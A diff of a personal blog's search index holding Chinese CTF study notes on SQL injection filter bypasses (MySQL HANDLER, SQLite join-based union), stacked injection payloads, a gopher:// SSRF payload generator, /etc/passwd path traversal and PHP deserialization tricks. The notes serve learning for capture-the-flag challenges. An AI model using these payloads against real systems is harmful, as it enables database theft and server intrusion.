@@ -54,6 +54,31 @@
     
     
     <entry>
+      <title>SQL&#39;select&#39;绕过</title>
+      <link href="/blog/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/"/>
+      <url>/blog/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/</url>
+      
+        <content type="html"><![CDATA[<h1 id="SQL’select’绕过"><a href="#SQL’select’绕过" class="headerlink" title="SQL’select’绕过"></a>SQL’select’绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>##直接查询<br>handler函数使用<br><code>语法</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">先是创造句柄</span><br><span class="line">handler `()` open as p;</span><br><span class="line"></span><br><span class="line">然后是查看数据</span><br><span class="line"># 获取第一行数据</span><br><span class="line">handler p read handler_index first;</span><br><span class="line"># 获取下一行数据</span><br><span class="line">handler p read handler_index next;</span><br><span class="line"># 获取上一行数据</span><br><span class="line">handler p read handler_index prev;</span><br><span class="line"># 获取最后一行数据</span><br><span class="line">handler p read handler_index last;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>##改表和行名<br>alter函数使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先将原来表名改为别的: alter table `默认的` rename to `sss`</span><br><span class="line">重命名表：alter table &#x27;表名&#x27; rename to &#x27;默认查寻的表名&#x27;。</span><br><span class="line">重命名字段：alter table &#x27;默认查询的表名&#x27; change &#x27;要转移的字段&#x27; &#x27;默认查询的字段&#x27; column_type（就是varchar(100)）;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL绕过 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SQL union联合注入</title>
       <link href="/blog/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
       <url>/blog/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
@@ -79,11 +104,11 @@
     
     
     <entry>
-      <title>SQL&#39;select&#39;绕过</title>
-      <link href="/blog/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/"/>
-      <url>/blog/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/</url>
+      <title>SQLite</title>
+      <link href="/blog/2026/01/28/SQLite/"/>
+      <url>/blog/2026/01/28/SQLite/</url>
       
-        <content type="html"><![CDATA[<h1 id="SQL’select’绕过"><a href="#SQL’select’绕过" class="headerlink" title="SQL’select’绕过"></a>SQL’select’绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>##直接查询<br>handler函数使用<br><code>语法</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">先是创造句柄</span><br><span class="line">handler `()` open as p;</span><br><span class="line"></span><br><span class="line">然后是查看数据</span><br><span class="line"># 获取第一行数据</span><br><span class="line">handler p read handler_index first;</span><br><span class="line"># 获取下一行数据</span><br><span class="line">handler p read handler_index next;</span><br><span class="line"># 获取上一行数据</span><br><span class="line">handler p read handler_index prev;</span><br><span class="line"># 获取最后一行数据</span><br><span class="line">handler p read handler_index last;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>##改表和行名<br>alter函数使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先将原来表名改为别的: alter table `默认的` rename to `sss`</span><br><span class="line">重命名表：alter table &#x27;表名&#x27; rename to &#x27;默认查寻的表名&#x27;。</span><br><span class="line">重命名字段：alter table &#x27;默认查询的表名&#x27; change &#x27;要转移的字段&#x27; &#x27;默认查询的字段&#x27; column_type（就是varchar(100)）;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+        <content type="html"><![CDATA[<h1 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h1><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
       
       
       <categories>
@@ -95,7 +120,7 @@
       
         <tags>
             
-            <tag> SQL绕过 </tag>
+            <tag> SQL </tag>
             
         </tags>
       
@@ -134,31 +159,6 @@
       <url>/blog/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
       
         <content type="html"><![CDATA[<h1 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h1><p>标签（空格分隔）： SQL</p><hr><p>运用情况：当有过滤select&#x2F;updata&#x2F;delete&#x2F;drop等等词的时候进行堆叠注入<br>所以只能使用hander来进行查询（hander不算正规的php，仅仅在MYsql中存在）<br>hander的</p><p>具体用法如下<br>– 创建索引<br><code>CREATE INDEX handler_index ON handler_table(id);</code></p><p>– 打开句柄<br><code>HANDLER handler_table OPEN AS p;</code></p><p>– 按索引读取第一行<br><code>HANDLER p READ handler_index FIRST;</code></p><p>– 按索引读取下一行<br><code>HANDLER p READ handler_index NEXT;</code></p><p>– 关闭句柄<br><code>HANDLER p CLOSE;</code></p><p>1.首先还是查询有几列<br><code>1&#39;order by 1;#</code></p><p>2.由于无法使用select，所以只能直接查询所有的数据库<br><code>1&#39;show databases;#</code></p><p>3.当查询到一个奇妙的数据库的时候使用<br><code>1&#39;;use (数据库名字);show tables;#</code></p><p>4.当找到了一个表有点奇怪（纯数字）的时候<br> <code>1&#39;;use supersqli;show columns from </code>表的名字<code>;#</code><br>&#x2F;&#x2F;注意当纯数字串是表名的时候要加反引号</p><p>5.此时可能找到了flag的位置，但是无法使用select所以使用hander<br><code>-1&#39;;use supersqli;handler (填入，纯数字记得加``) open as p;handler p read first;#</code></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> SQL </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>SQLite</title>
-      <link href="/blog/2026/01/28/SQLite/"/>
-      <url>/blog/2026/01/28/SQLite/</url>
-      
-        <content type="html"><![CDATA[<h1 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h1><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
       
       
       <categories>
@@ -229,6 +229,31 @@
     
     
     <entry>
+      <title>gopher_协议使用</title>
+      <link href="/blog/2026/01/28/gopher___%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8/"/>
+      <url>/blog/2026/01/28/gopher___%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="gopher-协议使用"><a href="#gopher-协议使用" class="headerlink" title="gopher:&#x2F;&#x2F;协议使用"></a>gopher:&#x2F;&#x2F;协议使用</h1><p>标签（空格分隔）： SSRF</p><hr><p>|gopher|发送原始 TCP 数据（高级利用）|构造gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%23…（向 MySQL 发送恶意 SQL 命令）|<br>|——|</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">传输脚本如下</span><br><span class="line"># 导入urllib.parse模块，用于URL编码处理</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line"># 定义目标主机和端口</span><br><span class="line">host = &quot;127.0.0.1:80&quot;</span><br><span class="line"># 定义POST请求的表单数据（模拟登录的用户名和密码）\\\\\\\\\\\\\\\\\\\\注意根据题目不同进行参数更改</span><br><span class="line">content = &quot;uname=admin&amp;passwd=admin&quot;</span><br><span class="line"># 计算POST数据的长度，用于HTTP头中的Content-Length字段</span><br><span class="line">content_length = len(content)</span><br><span class="line"></span><br><span class="line"># 构造完整的POST请求报文（HTTP协议格式）</span><br><span class="line">test =\</span><br><span class="line">&quot;&quot;&quot;POST /index.php HTTP/1.1  # HTTP方法为POST，请求路径为/index.php，协议版本1.1</span><br><span class="line">Host: &#123;&#125;  # 目标主机（通过format填充上面定义的host变量）</span><br><span class="line">User-Agent: curl/7.43.0  # 模拟curl的User-Agent头</span><br><span class="line">Accept: */*  # 接受所有类型的响应数据</span><br><span class="line">Content-Type: application/x-www-form-urlencoded  # 表单数据的MIME类型</span><br><span class="line">Content-Length: &#123;&#125;  # POST数据的长度（通过format填充content_length变量）</span><br><span class="line"></span><br><span class="line">&#123;&#125;  # POST请求的表单数据（通过format填充content变量）</span><br><span class="line"># &quot;&quot;&quot;.format(host,content_length,content)  # 用format方法替换占位符，填充host、长度和数据</span><br><span class="line"></span><br><span class="line"># 对构造的HTTP报文进行第一次URL编码（将特殊字符转为%XX格式）</span><br><span class="line">tmp = urllib.parse.quote(test)</span><br><span class="line"># 将编码后的换行符%0A（\n）替换为HTTP标准的回车换行%0D%0A（\r\n），避免协议解析错误</span><br><span class="line">new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)</span><br><span class="line"># 对处理后的字符串进行第二次URL编码，确保gopher协议能正确解析</span><br><span class="line">result = urllib.parse.quote(new)</span><br><span class="line"># 拼接为gopher协议URL（格式：gopher://主机/_编码后的请求内容），用于SSRF等场景</span><br><span class="line">print(&quot;gopher://&quot;+host+&quot;/_&quot;+result)</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SSRF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Crypto实用函数类</title>
       <link href="/blog/2026/01/28/crypto%20python%E5%87%BD%E6%95%B0%E7%B1%BB/"/>
       <url>/blog/2026/01/28/crypto%20python%E5%87%BD%E6%95%B0%E7%B1%BB/</url>
@@ -254,11 +279,11 @@
     
     
     <entry>
-      <title>gopher_协议使用</title>
-      <link href="/blog/2026/01/28/gopher___%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8/"/>
-      <url>/blog/2026/01/28/gopher___%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8/</url>
+      <title>文件包含漏洞</title>
+      <link href="/blog/2026/01/28/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
+      <url>/blog/2026/01/28/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
       
-        <content type="html"><![CDATA[<h1 id="gopher-协议使用"><a href="#gopher-协议使用" class="headerlink" title="gopher:&#x2F;&#x2F;协议使用"></a>gopher:&#x2F;&#x2F;协议使用</h1><p>标签（空格分隔）： SSRF</p><hr><p>|gopher|发送原始 TCP 数据（高级利用）|构造gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%23…（向 MySQL 发送恶意 SQL 命令）|<br>|——|</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">传输脚本如下</span><br><span class="line"># 导入urllib.parse模块，用于URL编码处理</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line"># 定义目标主机和端口</span><br><span class="line">host = &quot;127.0.0.1:80&quot;</span><br><span class="line"># 定义POST请求的表单数据（模拟登录的用户名和密码）\\\\\\\\\\\\\\\\\\\\注意根据题目不同进行参数更改</span><br><span class="line">content = &quot;uname=admin&amp;passwd=admin&quot;</span><br><span class="line"># 计算POST数据的长度，用于HTTP头中的Content-Length字段</span><br><span class="line">content_length = len(content)</span><br><span class="line"></span><br><span class="line"># 构造完整的POST请求报文（HTTP协议格式）</span><br><span class="line">test =\</span><br><span class="line">&quot;&quot;&quot;POST /index.php HTTP/1.1  # HTTP方法为POST，请求路径为/index.php，协议版本1.1</span><br><span class="line">Host: &#123;&#125;  # 目标主机（通过format填充上面定义的host变量）</span><br><span class="line">User-Agent: curl/7.43.0  # 模拟curl的User-Agent头</span><br><span class="line">Accept: */*  # 接受所有类型的响应数据</span><br><span class="line">Content-Type: application/x-www-form-urlencoded  # 表单数据的MIME类型</span><br><span class="line">Content-Length: &#123;&#125;  # POST数据的长度（通过format填充content_length变量）</span><br><span class="line"></span><br><span class="line">&#123;&#125;  # POST请求的表单数据（通过format填充content变量）</span><br><span class="line"># &quot;&quot;&quot;.format(host,content_length,content)  # 用format方法替换占位符，填充host、长度和数据</span><br><span class="line"></span><br><span class="line"># 对构造的HTTP报文进行第一次URL编码（将特殊字符转为%XX格式）</span><br><span class="line">tmp = urllib.parse.quote(test)</span><br><span class="line"># 将编码后的换行符%0A（\n）替换为HTTP标准的回车换行%0D%0A（\r\n），避免协议解析错误</span><br><span class="line">new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)</span><br><span class="line"># 对处理后的字符串进行第二次URL编码，确保gopher协议能正确解析</span><br><span class="line">result = urllib.parse.quote(new)</span><br><span class="line"># 拼接为gopher协议URL（格式：gopher://主机/_编码后的请求内容），用于SSRF等场景</span><br><span class="line">print(&quot;gopher://&quot;+host+&quot;/_&quot;+result)</span><br></pre></td></tr></table></figure>]]></content>
+        <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>标签（空格分隔）： 文件类</p><hr><p>通常没有看到可以输入的框的时候可以试着看看URL的构造来进行分析<br>以攻防世界—-catcat-new为例<br>看着没有什么输入口但是观察URL–</p><p><a href="http://61.147.171.35:51092/info?file=ForestCat.txt">http://61.147.171.35:51092/info?file=ForestCat.txt</a></p><p>有一个get了一个file&#x3D;……此时思考是否会存在文件包含漏洞<br>进行目录遍历..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd看看</p><p>![基础知识][1]<br>  [1]: <a href="https://i-blog.csdnimg.cn/blog_migrate/a32eefce2f8aed5db5aa74de0dc8dd14.png">https://i-blog.csdnimg.cn/blog_migrate/a32eefce2f8aed5db5aa74de0dc8dd14.png</a></p><p>然后再用diserach扫描看看有没有可以访问的窗口<br>再用用wappalyzer看看框架，再搜一下他的主文件是什么<br>再进行目录遍历查询主文件</p><p>flask框架的主文件是app.py查询后由于过于复杂此时要进行可视化</p><pre><code>#需要格式化的代码</code></pre><p>code_str &#x3D; ‘’’输入’’’<br>lines &#x3D; code_str.split(‘\n’)<br>indented_lines &#x3D; [line if line.strip() else ‘’ for line in lines]<br>formatted_code &#x3D; ‘\n’.join(indented_lines)<br>print(formatted_code)</p><p>获得过后再进行代码审计再选择下一步</p>]]></content>
       
       
       <categories>
@@ -270,7 +295,7 @@
       
         <tags>
             
-            <tag> SSRF </tag>
+            <tag> PHP </tag>
             
         </tags>
       
@@ -309,31 +334,6 @@
       <url>/blog/2026/01/28/php%E9%AD%94%E6%9C%AF%E6%8A%80%E5%B7%A7/</url>
       
         <content type="html"><![CDATA[<h1 id="php魔术技巧"><a href="#php魔术技巧" class="headerlink" title="php魔术技巧"></a>php魔术技巧</h1><p>标签（空格分隔）： PHP #魔术技巧#</p><p>—php</p><p>反序列化的基本格式：O:组的字节:”定义的组的名字”:有几个参数:{s:4:”flag”;s:3:”111”;}</p><p>构造脚本可以在后面这么加$A &#x3D; new Demo (‘fl4g.php’);&#x2F;&#x2F;创建对象<br>                                      $C &#x3D; serialize($A); </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_wakeup()：如果察觉到有反序列化的参数值那么将会拒绝执行</span><br><span class="line">//绕过方法：将序列化的对象的属性（参数个数）个数改了</span><br><span class="line"></span><br><span class="line">__destruct():当对象的所有引用被删除或脚本执行结束时，PHP 会自动调用析构函数。</span><br><span class="line"></span><br><span class="line">preg_match(’/[oc]:\d+:/i’, $var)：当中括号的东西出现就会被过滤&#123;应对办法：单双引号绕过</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__construct()：这是一个构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法。</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> PHP </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>文件包含漏洞</title>
-      <link href="/blog/2026/01/28/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
-      <url>/blog/2026/01/28/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
-      
-        <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>标签（空格分隔）： 文件类</p><hr><p>通常没有看到可以输入的框的时候可以试着看看URL的构造来进行分析<br>以攻防世界—-catcat-new为例<br>看着没有什么输入口但是观察URL–</p><p><a href="http://61.147.171.35:51092/info?file=ForestCat.txt">http://61.147.171.35:51092/info?file=ForestCat.txt</a></p><p>有一个get了一个file&#x3D;……此时思考是否会存在文件包含漏洞<br>进行目录遍历..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd看看</p><p>![基础知识][1]<br>  [1]: <a href="https://i-blog.csdnimg.cn/blog_migrate/a32eefce2f8aed5db5aa74de0dc8dd14.png">https://i-blog.csdnimg.cn/blog_migrate/a32eefce2f8aed5db5aa74de0dc8dd14.png</a></p><p>然后再用diserach扫描看看有没有可以访问的窗口<br>再用用wappalyzer看看框架，再搜一下他的主文件是什么<br>再进行目录遍历查询主文件</p><p>flask框架的主文件是app.py查询后由于过于复杂此时要进行可视化</p><pre><code>#需要格式化的代码</code></pre><p>code_str &#x3D; ‘’’输入’’’<br>lines &#x3D; code_str.split(‘\n’)<br>indented_lines &#x3D; [line if line.strip() else ‘’ for line in lines]<br>formatted_code &#x3D; ‘\n’.join(indented_lines)<br>print(formatted_code)</p><p>获得过后再进行代码审计再选择下一步</p>]]></content>
       
       
       <categories>
